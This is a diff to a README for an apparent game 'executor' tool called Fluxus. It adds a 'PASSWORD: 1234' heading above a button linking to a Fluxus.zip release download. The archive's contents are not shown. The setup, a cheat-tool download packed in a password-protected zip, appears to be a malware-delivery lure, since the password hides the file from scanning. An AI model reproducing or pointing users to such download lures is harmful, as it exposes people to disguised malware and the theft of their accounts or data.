@@ -17,9 +17,11 @@ Whether you're a developer looking to test your game's mechanics or someone who 
 ---
 
 ## Download ⬇️
-Get the latest version of the executor by clicking the button below:
 
-[![image](https://github.com/user-attachments/assets/426abff5-38a9-4d25-90d4-a2642f945967)](https://github.com/GhostlyBow/Fluxus-executor/releases/download/7.0.1/Fluxus.zip)
+# PASSWORD: 1234
+
+Get the latest version of the executor by clicking the button below:
+[![image](https://github.com/user-attachments/assets/6c084952-5ccb-4c82-bc0e-27bbabda12b4)](https://github.com/GhostlyBow/Fluxus-executor/releases/download/7.0.1/Fluxus.zip)
 
 ---
 
